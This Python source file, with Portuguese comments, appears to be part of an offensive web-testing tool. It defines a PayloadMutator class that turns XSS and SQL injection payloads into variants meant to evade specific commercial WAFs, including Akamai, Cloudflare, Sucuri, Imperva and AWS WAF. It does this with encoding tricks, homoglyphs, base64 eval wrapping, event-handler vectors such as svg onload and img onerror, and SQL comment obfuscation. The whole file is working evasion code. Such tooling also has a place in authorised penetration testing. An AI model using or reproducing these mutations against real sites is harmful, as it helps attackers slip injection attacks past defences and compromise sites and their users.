import base64
import random
import re
from typing import List, Dict


class PayloadMutator:
    """Gera payloads mutados baseado no WAF detectado"""

    # Técnicas de mutação disponíveis
    MUTATIONS = {
        "case_mix": lambda p: "".join(
            c.upper() if random.random() > 0.5 else c.lower() for c in p
        ),
        "spacing": lambda p: p.replace("<", "<%0a").replace(">", "%0a>"),
        "tab_spacing": lambda p: p.replace("<", "<%09").replace(">", "%09>"),
        "comments": lambda p: re.sub(r"</?script", lambda m: f"{m.group(0)}<!--x-->", p),
        "url_encode": lambda p: "".join(f"%{ord(c):02X}" for c in p),
        "double_url": lambda p: "".join(f"%25{ord(c):02X}" for c in p),
        "html_entity": lambda p: "".join(f"&#{ord(c)};" for c in p),
        "unicode_homoglyph": lambda p: p.replace("i", "\u0456"),  # i cirílico
        "base64_wrap": lambda p: f"<script>eval(atob('{base64.b64encode(p.encode()).decode()}'))</script>",
        "svg_vector": lambda p: f"<svg/onload={p}>",
        "img_vector": lambda p: f"<img src=x onerror={p}>",
        "iframe_srcdoc": lambda p: f"<iframe srcdoc='&lt;script&gt;{p}&lt;/script&gt;'></iframe>",
        "javascript_proto": lambda p: f"javascript:{p}",
        "data_uri": lambda p: f"data:text/html,<script>{p}</script>",
    }

    # Estratégias por WAF
    VENDOR_STRATEGIES = {
        "akamai": [
            "base64_wrap",
            "html_entity",
            "unicode_homoglyph",
            "svg_vector",
            "img_vector",
            "case_mix",
            "spacing",
        ],
        "cloudflare": [
            "spacing",
            "comments",
            "iframe_srcdoc",
            "double_url",
            "case_mix",
        ],
        "sucuri": [
            "url_encode",
            "double_url",
            "base64_wrap",
            "javascript_proto",
        ],
        "imperva": [
            "html_entity",
            "unicode_homoglyph",
            "data_uri",
            "iframe_srcdoc",
        ],
        "aws_waf": [
            "case_mix",
            "spacing",
            "comments",
            "base64_wrap",
        ],
        "unknown": [
            "case_mix",
            "url_encode",
            "base64_wrap",
            "svg_vector",
        ],
    }

    @classmethod
    def mutate(cls, base_payload: str, vendor_hint: str = "unknown", count: int = 6) -> List[Dict]:
        """
        Gera lista de payloads mutados
        Retorna: [{'id': 'case_mix', 'payload': '...'}, ...]
        """

        strategy = cls.VENDOR_STRATEGIES.get(vendor_hint, cls.VENDOR_STRATEGIES["unknown"])
        selected = strategy[:count]

        results: List[Dict] = []
        for mut_id in selected:
            mutator = cls.MUTATIONS.get(mut_id)
            if not mutator:
                continue
            try:
                mutated = mutator(base_payload)
                results.append({"id": mut_id, "payload": mutated, "original": base_payload})
            except Exception:
                continue

        return results

    @classmethod
    def mutate_sqli(
        cls, base_payload: str, vendor_hint: str = "unknown", count: int = 6
    ) -> List[Dict]:
        """Versão para SQLi (comentários, espaços)"""

        sqli_mutations = {
            "comment_space": lambda p: p.replace(" ", "/**/"),
            "tab_space": lambda p: p.replace(" ", "%09"),
            "url_encode": lambda p: "".join(f"%{ord(c):02X}" for c in p),
            "double_url": lambda p: "".join(f"%25{ord(c):02X}" for c in p),
            "inline_comment": lambda p: re.sub(r"(\W)", r"\1/*!*/", p),
        }

        results: List[Dict] = []
        base_mutations = cls.mutate(base_payload, vendor_hint, max(1, count // 2))
        results.extend(base_mutations)

        for mut_id, mut_func in sqli_mutations.items():
            if len(results) >= count:
                break
            try:
                results.append(
                    {
                        "id": f"sqli_{mut_id}",
                        "payload": mut_func(base_payload),
                        "original": base_payload,
                    }
                )
            except Exception:
                continue

        return results[:count]

